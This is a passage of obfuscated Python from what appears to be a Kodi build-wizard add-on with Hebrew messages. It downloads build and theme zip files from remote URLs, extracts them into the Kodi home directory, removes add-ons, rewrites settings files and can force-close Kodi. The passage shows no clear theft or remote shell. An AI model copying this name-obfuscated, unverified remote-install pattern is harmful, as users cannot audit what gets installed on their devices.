		except :#line:3866
				pass #line:3867
		swapSkins ('skin.Premium.mod')#line:3868
def fix18update ():#line:3870
	if KODIV >=18 :#line:3871
		xbmc .sleep (4000 )#line:3872
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3873
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3874
		fixfont ()#line:3875
		O0OOO0OOO0O0OO00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3876
		try :#line:3877
			O00O0OOO0OOOO00OO =open (O0OOO0OOO0O0OO00O ,'r')#line:3878
			OO0OOO000000O0OO0 =O00O0OOO0OOOO00OO .read ()#line:3879
			O00O0OOO0OOOO00OO .close ()#line:3880
			O0OOO0OOO0OOOOO00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3881
			OOOO000OO00OO0O00 =re .compile (O0OOO0OOO0OOOOO00 ).findall (OO0OOO000000O0OO0 )[0 ]#line:3882
			O00O0OOO0OOOO00OO =open (O0OOO0OOO0O0OO00O ,'w')#line:3883
			O00O0OOO0OOOO00OO .write (OO0OOO000000O0OO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOO000OO00OO0O00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3884
			O00O0OOO0OOOO00OO .close ()#line:3885
		except :#line:3886
				pass #line:3887
		wiz .kodi17Fix ()#line:3888
		O0OOO0OOO0O0OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3889
		try :#line:3890
			O00O0OOO0OOOO00OO =open (O0OOO0OOO0O0OO00O ,'r')#line:3891
			OO0OOO000000O0OO0 =O00O0OOO0OOOO00OO .read ()#line:3892
			O00O0OOO0OOOO00OO .close ()#line:3893
			O0OOO0OOO0OOOOO00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3894
			OOOO000OO00OO0O00 =re .compile (O0OOO0OOO0OOOOO00 ).findall (OO0OOO000000O0OO0 )[0 ]#line:3895
			O00O0OOO0OOOO00OO =open (O0OOO0OOO0O0OO00O ,'w')#line:3896
			O00O0OOO0OOOO00OO .write (OO0OOO000000O0OO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOO000OO00OO0O00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3897
			O00O0OOO0OOOO00OO .close ()#line:3898
		except :#line:3899
				pass #line:3900
		swapSkins ('skin.Premium.mod')#line:3901
def buildWizard (O00O0O0O00OOO0OOO ,OO0OO000OOOOO0O0O ,theme =None ,over =False ):#line:3904
	if over ==False :#line:3905
		O00000O0O0O00O0O0 =wiz .checkBuild (O00O0O0O00OOO0OOO ,'url')#line:3906
		if O00000O0O0O00O0O0 ==False :#line:3908
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3913
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3914
			return #line:3915
		O0O0000O0O0O0O0O0 =wiz .workingURL (O00000O0O0O00O0O0 )#line:3916
		if O0O0000O0O0O0O0O0 ==False :#line:3917
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0000O0O0O0O0O0 ))#line:3918
			return #line:3919
	if OO0OO000OOOOO0O0O =='gui':#line:3920
		if O00O0O0O00OOO0OOO ==BUILDNAME :#line:3921
			if over ==True :OO0OO0OOOOO0000O0 =1 #line:3922
			else :OO0OO0OOOOO0000O0 =1 #line:3923
		else :#line:3924
			OO0OO0OOOOO0000O0 =1 #line:3925
		if OO0OO0OOOOO0000O0 :#line:3926
			remove_addons ()#line:3927
			remove_addons2 ()#line:3928
			debridit .debridIt ('update','all')#line:3929
			traktit .traktIt ('update','all')#line:3930
			OO0O0000000O00O00 =wiz .checkBuild (O00O0O0O00OOO0OOO ,'gui')#line:3931
			OOOOOOOOO00OO0O0O =O00O0O0O00OOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3932
			if not wiz .workingURL (OO0O0000000O00O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3933
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3934
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO ),'','אנא המתן')#line:3935
			OO0O000OO0O0O0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOO00OO0O0O )#line:3936
			try :os .remove (OO0O000OO0O0O0OOO )#line:3937
			except :pass #line:3938
			logging .warning (OO0O0000000O00O00 )#line:3939
			if 'google'in OO0O0000000O00O00 :#line:3940
			   O0OOOO0OO00000O0O =googledrive_download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'filesize'))#line:3941
			else :#line:3944
			  downloader .download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP )#line:3945
			xbmc .sleep (100 )#line:3946
			O000O0O0OO0000OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO )#line:3947
			DP .update (0 ,O000O0O0OO0000OOO ,'','אנא המתן')#line:3948
			extract .all (OO0O000OO0O0O0OOO ,HOME ,DP ,title =O000O0O0OO0000OOO )#line:3949
			DP .close ()#line:3950
			wiz .defaultSkin ()#line:3951
			wiz .lookandFeelData ('save')#line:3952
			wiz .kodi17Fix ()#line:3953
			if KODIV >=18 :#line:3954
				skindialogsettind18 ()#line:3955
			debridit .debridIt ('restore','all')#line:3956
			traktit .traktIt ('restore','all')#line:3957
			if INSTALLMETHOD ==1 :OO0O0OO0O0000O000 =1 #line:3959
			elif INSTALLMETHOD ==2 :OO0O0OO0O0000O000 =0 #line:3960
			else :DP .close ()#line:3961
			OOOOO0000000O0OO0 =(NOTIFICATION2 )#line:3962
			O00OOO00O00O000O0 =urllib2 .urlopen (OOOOO0000000O0OO0 )#line:3963
			O0OOO00000OO0OO0O =O00OOO00O00O000O0 .readlines ()#line:3964
			O00OO000O0O0000OO =0 #line:3965
			for O0O0OOO0O00OO0OO0 in O0OOO00000OO0OO0O :#line:3968
				if O0O0OOO0O00OO0OO0 .split (' ==')[0 ]=="noreset"or O0O0OOO0O00OO0OO0 .split ()[0 ]=="noreset":#line:3969
					xbmc .executebuiltin ("ReloadSkin()")#line:3971
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3972
					update_Votes ()#line:3973
					indicatorfastupdate ()#line:3974
				if O0O0OOO0O00OO0OO0 .split (' ==')[0 ]=="reset"or O0O0OOO0O00OO0OO0 .split ()[0 ]=="reset":#line:3975
					update_Votes ()#line:3977
					indicatorfastupdate ()#line:3978
					resetkodi ()#line:3979
		else :#line:3988
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3989
	if OO0OO000OOOOO0O0O =='gui2':#line:3990
		if O00O0O0O00OOO0OOO ==BUILDNAME :#line:3991
			if over ==True :OO0OO0OOOOO0000O0 =1 #line:3992
			else :OO0OO0OOOOO0000O0 =1 #line:3993
		else :#line:3994
			OO0OO0OOOOO0000O0 =1 #line:3995
		if OO0OO0OOOOO0000O0 :#line:3996
			remove_addons ()#line:3997
			remove_addons2 ()#line:3998
			OO0O0000000O00O00 =wiz .checkBuild (O00O0O0O00OOO0OOO ,'gui')#line:3999
			OOOOOOOOO00OO0O0O =O00O0O0O00OOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4000
			if not wiz .workingURL (OO0O0000000O00O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4001
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4002
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO ),'','אנא המתן')#line:4003
			OO0O000OO0O0O0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOOOOO00OO0O0O )#line:4004
			try :os .remove (OO0O000OO0O0O0OOO )#line:4005
			except :pass #line:4006
			logging .warning (OO0O0000000O00O00 )#line:4007
			if 'google'in OO0O0000000O00O00 :#line:4008
			   O0OOOO0OO00000O0O =googledrive_download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'filesize'))#line:4009
			else :#line:4012
			  downloader .download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP )#line:4013
			xbmc .sleep (100 )#line:4014
			O000O0O0OO0000OOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO )#line:4015
			DP .update (0 ,O000O0O0OO0000OOO ,'','אנא המתן')#line:4016
			extract .all (OO0O000OO0O0O0OOO ,HOME ,DP ,title =O000O0O0OO0000OOO )#line:4017
			DP .close ()#line:4018
			wiz .defaultSkin ()#line:4019
			wiz .lookandFeelData ('save')#line:4020
			if INSTALLMETHOD ==1 :OO0O0OO0O0000O000 =1 #line:4023
			elif INSTALLMETHOD ==2 :OO0O0OO0O0000O000 =0 #line:4024
			else :DP .close ()#line:4025
		else :#line:4027
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4028
	elif OO0OO000OOOOO0O0O =='fresh':#line:4029
		freshStart (O00O0O0O00OOO0OOO )#line:4030
	elif OO0OO000OOOOO0O0O =='normal':#line:4031
		if url =='normal':#line:4032
			if KEEPTRAKT =='true':#line:4033
				traktit .autoUpdate ('all')#line:4034
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4035
			if KEEPREAL =='true':#line:4036
				debridit .autoUpdate ('all')#line:4037
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4038
			if KEEPLOGIN =='true':#line:4039
				loginit .autoUpdate ('all')#line:4040
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4041
		OO00OOO0000OO0O0O =int (KODIV );O0OOOOO000O0000O0 =int (float (wiz .checkBuild (O00O0O0O00OOO0OOO ,'kodi')))#line:4042
		if not OO00OOO0000OO0O0O ==O0OOOOO000O0000O0 :#line:4043
			if OO00OOO0000OO0O0O ==16 and O0OOOOO000O0000O0 <=15 :O00OO00O0OOOO0OO0 =False #line:4044
			else :O00OO00O0OOOO0OO0 =True #line:4045
		else :O00OO00O0OOOO0OO0 =False #line:4046
		if O00OO00O0OOOO0OO0 ==True :#line:4047
			O0OO0OO0O0OOO00OO =1 #line:4048
		else :#line:4049
			if not over ==False :O0OO0OO0O0OOO00OO =1 #line:4050
			else :O0OO0OO0O0OOO00OO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4051
		if O0OO0OO0O0OOO00OO :#line:4052
			wiz .clearS ('build')#line:4053
			OO0O0000000O00O00 =wiz .checkBuild (O00O0O0O00OOO0OOO ,'url')#line:4054
			OOOOOOOOO00OO0O0O =O00O0O0O00OOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4055
			if not wiz .workingURL (OO0O0000000O00O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4056
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4057
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'version')),'','אנא המתן')#line:4058
			OO0O000OO0O0O0OOO =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOOO00OO0O0O )#line:4059
			try :os .remove (OO0O000OO0O0O0OOO )#line:4060
			except :pass #line:4061
			logging .warning (OO0O0000000O00O00 )#line:4062
			if 'google'in OO0O0000000O00O00 :#line:4063
			   O0OOOO0OO00000O0O =googledrive_download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'filesize'))#line:4064
			else :#line:4067
			  downloader .download (OO0O0000000O00O00 ,OO0O000OO0O0O0OOO ,DP )#line:4068
			xbmc .sleep (1000 )#line:4069
			O000O0O0OO0000OOO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'version'))#line:4070
			DP .update (0 ,O000O0O0OO0000OOO ,'','אנא המתן...')#line:4071
			OOOOOO00OO0000000 ,OOOO0O0O00O000OO0 ,OO0000000O00O00O0 =extract .all (OO0O000OO0O0O0OOO ,HOME ,DP ,title =O000O0O0OO0000OOO )#line:4072
			if int (float (OOOOOO00OO0000000 ))>0 :#line:4073
				try :#line:4074
					wiz .fixmetas ()#line:4075
				except :pass #line:4076
				wiz .lookandFeelData ('save')#line:4077
				wiz .defaultSkin ()#line:4078
				wiz .setS ('buildname',O00O0O0O00OOO0OOO )#line:4080
				wiz .setS ('buildversion',wiz .checkBuild (O00O0O0O00OOO0OOO ,'version'))#line:4081
				wiz .setS ('buildtheme','')#line:4082
				wiz .setS ('latestversion',wiz .checkBuild (O00O0O0O00OOO0OOO ,'version'))#line:4083
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4084
				wiz .setS ('installed','true')#line:4085
				wiz .setS ('extract',str (OOOOOO00OO0000000 ))#line:4086
				wiz .setS ('errors',str (OOOO0O0O00O000OO0 ))#line:4087
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOOOO00OO0000000 ,OOOO0O0O00O000OO0 ))#line:4088
				fastupdatefirstbuild (NOTEID )#line:4089
				wiz .kodi17Fix ()#line:4090
				skin_homeselect ()#line:4091
				skin_lower ()#line:4092
				rdbuildinstall ()#line:4093
				try :gaiaserenaddon ()#line:4094
				except :pass #line:4095
				adults18 ()#line:4096
				skinfix18 ()#line:4097
				try :os .remove (OO0O000OO0O0O0OOO )#line:4099
				except :pass #line:4100
				O0O0O0OO0OOOO00OO =(ADDON .getSetting ("auto_rd"))#line:4101
				if O0O0O0OO0OOOO00OO =='true':#line:4102
					try :#line:4103
						setautorealdebrid ()#line:4104
					except :pass #line:4105
				try :#line:4106
					autotrakt ()#line:4107
				except :pass #line:4108
				OOO0O0O00O0OO0O00 =(ADDON .getSetting ("imdb_on"))#line:4109
				if OOO0O0O00O0OO0O00 =='true':#line:4110
					imdb_synck ()#line:4111
				iptvset ()#line:4112
				DP .close ()#line:4120
				O00OOO00OOOOO00O0 =wiz .themeCount (O00O0O0O00OOO0OOO )#line:4121
				builde_Votes ()#line:4122
				indicator ()#line:4123
				if not O00OOO00OOOOO00O0 ==False :#line:4124
					buildWizard (O00O0O0O00OOO0OOO ,'theme')#line:4125
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4126
				if INSTALLMETHOD ==1 :OO0O0OO0O0000O000 =1 #line:4127
				elif INSTALLMETHOD ==2 :OO0O0OO0O0000O000 =0 #line:4128
				else :resetkodi ()#line:4129
				if OO0O0OO0O0000O000 ==1 :wiz .reloadFix ()#line:4131
				else :wiz .killxbmc (True )#line:4132
			else :#line:4133
				if isinstance (OOOO0O0O00O000OO0 ,unicode ):#line:4134
					OO0000000O00O00O0 =OO0000000O00O00O0 .encode ('utf-8')#line:4135
				OO0000O000O0O00O0 =open (OO0O000OO0O0O0OOO ,'r')#line:4136
				OOO00000OO00O0O0O =OO0000O000O0O00O0 .read ()#line:4137
				O0O00O0OO0O0OO000 =''#line:4138
				for OOO0O00O0O0O0OOO0 in O0OOOO0OO00000O0O :#line:4139
				  O0O00O0OO0O0OO000 ='key: '+O0O00O0OO0O0OO000 +'\n'+OOO0O00O0O0O0OOO0 #line:4140
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0000000O00O00O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0O00O0OO0O0OO000 )#line:4141
		else :#line:4142
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4143
	elif OO0OO000OOOOO0O0O =='theme':#line:4144
		if theme ==None :#line:4145
			O00OOO00OOOOO00O0 =wiz .checkBuild (O00O0O0O00OOO0OOO ,'theme')#line:4146
			OOO0O0000000OO000 =[]#line:4147
			if not O00OOO00OOOOO00O0 =='http://'and wiz .workingURL (O00OOO00OOOOO00O0 )==True :#line:4148
				OOO0O0000000OO000 =wiz .themeCount (O00O0O0O00OOO0OOO ,False )#line:4149
				if len (OOO0O0000000OO000 )>0 :#line:4150
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00O0O0O00OOO0OOO ,COLOR1 ,len (OOO0O0000000OO000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4151
						wiz .log ("Theme List: %s "%str (OOO0O0000000OO000 ))#line:4152
						OO0O0OO0O00OO00O0 =DIALOG .select (ADDONTITLE ,OOO0O0000000OO000 )#line:4153
						wiz .log ("Theme install selected: %s"%OO0O0OO0O00OO00O0 )#line:4154
						if not OO0O0OO0O00OO00O0 ==-1 :theme =OOO0O0000000OO000 [OO0O0OO0O00OO00O0 ];OOO00O000000O000O =True #line:4155
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4156
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4157
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4158
		else :OOO00O000000O000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00O0O0O00OOO0OOO ,wiz .checkBuild (O00O0O0O00OOO0OOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4159
		if OOO00O000000O000O :#line:4160
			O0OO0O0000OOOO000 =wiz .checkTheme (O00O0O0O00OOO0OOO ,theme ,'url')#line:4161
			OOOOOOOOO00OO0O0O =O00O0O0O00OOO0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4162
			if not wiz .workingURL (O0OO0O0000OOOO000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4163
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4164
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4165
			OO0O000OO0O0O0OOO =os .path .join (PACKAGES ,'%s.zip'%OOOOOOOOO00OO0O0O )#line:4166
			try :os .remove (OO0O000OO0O0O0OOO )#line:4167
			except :pass #line:4168
			downloader .download (O0OO0O0000OOOO000 ,OO0O000OO0O0O0OOO ,DP )#line:4169
			xbmc .sleep (1000 )#line:4170
			DP .update (0 ,"","Installing %s "%O00O0O0O00OOO0OOO )#line:4171
			O0O00O0000O0OOO0O =False #line:4172
			if url not in ["fresh","normal"]:#line:4173
				O0O00O0000O0OOO0O =testTheme (OO0O000OO0O0O0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4174
				O0OO0OOOOO0OO0000 =testGui (OO0O000OO0O0O0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4175
				if O0O00O0000O0OOO0O ==True :#line:4176
					wiz .lookandFeelData ('save')#line:4177
					O0O00OOOO0O00OO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4178
					O00OO0O0OO000O0OO =xbmc .getSkinDir ()#line:4179
					skinSwitch .swapSkins (O0O00OOOO0O00OO0O )#line:4181
					O0OOO00000OO0OO0O =0 #line:4182
					xbmc .sleep (1000 )#line:4183
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO00000OO0OO0O <150 :#line:4184
						O0OOO00000OO0OO0O +=1 #line:4185
						xbmc .sleep (1000 )#line:4186
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4187
						wiz .ebi ('SendClick(11)')#line:4188
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4189
					xbmc .sleep (1000 )#line:4190
			O000O0O0OO0000OOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4191
			DP .update (0 ,O000O0O0OO0000OOO ,'','אנא המתן')#line:4192
			OOOOOO00OO0000000 ,OOOO0O0O00O000OO0 ,OO0000000O00O00O0 =extract .all (OO0O000OO0O0O0OOO ,HOME ,DP ,title =O000O0O0OO0000OOO )#line:4193
			wiz .setS ('buildtheme',theme )#line:4194
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOOOO00OO0000000 ,OOOO0O0O00O000OO0 ))#line:4195
			DP .close ()#line:4196
			if url not in ["fresh","normal"]:#line:4197
				wiz .forceUpdate ()#line:4198
				if KODIV >=17 :wiz .kodi17Fix ()#line:4199
				if O0OO0OOOOO0OO0000 ==True :#line:4200
					wiz .lookandFeelData ('save')#line:4201
					wiz .defaultSkin ()#line:4202
					O00OO0O0OO000O0OO =wiz .getS ('defaultskin')#line:4203
					skinSwitch .swapSkins (O00OO0O0OO000O0OO )#line:4204
					O0OOO00000OO0OO0O =0 #line:4205
					xbmc .sleep (1000 )#line:4206
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO00000OO0OO0O <150 :#line:4207
						O0OOO00000OO0OO0O +=1 #line:4208
						xbmc .sleep (1000 )#line:4209
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4211
						wiz .ebi ('SendClick(11)')#line:4212
					wiz .lookandFeelData ('restore')#line:4213
				elif O0O00O0000O0OOO0O ==True :#line:4214
					skinSwitch .swapSkins (O00OO0O0OO000O0OO )#line:4215
					O0OOO00000OO0OO0O =0 #line:4216
					xbmc .sleep (1000 )#line:4217
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO00000OO0OO0O <150 :#line:4218
						O0OOO00000OO0OO0O +=1 #line:4219
						xbmc .sleep (1000 )#line:4220
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4222
						wiz .ebi ('SendClick(11)')#line:4223
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4224
					wiz .lookandFeelData ('restore')#line:4225
				else :#line:4226
					wiz .ebi ("ReloadSkin()")#line:4227
					xbmc .sleep (1000 )#line:4228
					wiz .ebi ("Container.Refresh")#line:4229
		else :#line:4230
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4231
def skin_homeselect ():#line:4235
	try :#line:4237
		OOO00O0O0OO00OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4238
		O00O000O00O0O000O =open (OOO00O0O0OO00OOO0 ,'r')#line:4240
		OO00OOOO00OO00OOO =O00O000O00O0O000O .read ()#line:4241
		O00O000O00O0O000O .close ()#line:4242
		OO0O00OO00O0OOO00 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4243
		OO0O0OOO0O0O00000 =re .compile (OO0O00OO00O0OOO00 ).findall (OO00OOOO00OO00OOO )[0 ]#line:4244
		O00O000O00O0O000O =open (OOO00O0O0OO00OOO0 ,'w')#line:4245
		O00O000O00O0O000O .write (OO00OOOO00OO00OOO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O0OOO0O0O00000 ,'<setting id="HomeS" type="string"></setting>'))#line:4246
		O00O000O00O0O000O .close ()#line:4247
	except :#line:4248
		pass #line:4249
def skin_lower ():#line:4252
	OOO00O0OOOOOOOO00 =(ADDON .getSetting ("lower"))#line:4253
	if OOO00O0OOOOOOOO00 =='true':#line:4254
		try :#line:4257
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4260
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4261
			OOO0OO0OOOOOO00OO .close ()#line:4262
			OO0OO0OO000OOOOOO ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4263
			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4264
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4265
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="none_widget" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4266
			OOO0OO0OOOOOO00OO .close ()#line:4267
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4269
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4271
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4272
			OOO0OO0OOOOOO00OO .close ()#line:4273
			OO0OO0OO000OOOOOO ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4274
			O00OOOOO0OOOOOO00 =re .compile (OO0OO0OO000OOOOOO ).findall (O0OO0OO00OO0OO0OO )[0 ]#line:4275
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'w')#line:4276
			OOO0OO0OOOOOO00OO .write (O0OO0OO00OO0OO0OO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00OOOOO0OOOOOO00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4277
			OOO0OO0OOOOOO00OO .close ()#line:4278
			O0OOOO00OO00O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4280
			OOO0OO0OOOOOO00OO =open (O0OOOO00OO00O0OO0 ,'r')#line:4282
			O0OO0OO00OO0OO0OO =OOO0OO0OOOOOO00OO .read ()#line:4283
			OOO0OO0OOOOOO00OO .close ()#line:4284
			OO0OO0OO000OOOOOO ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4285
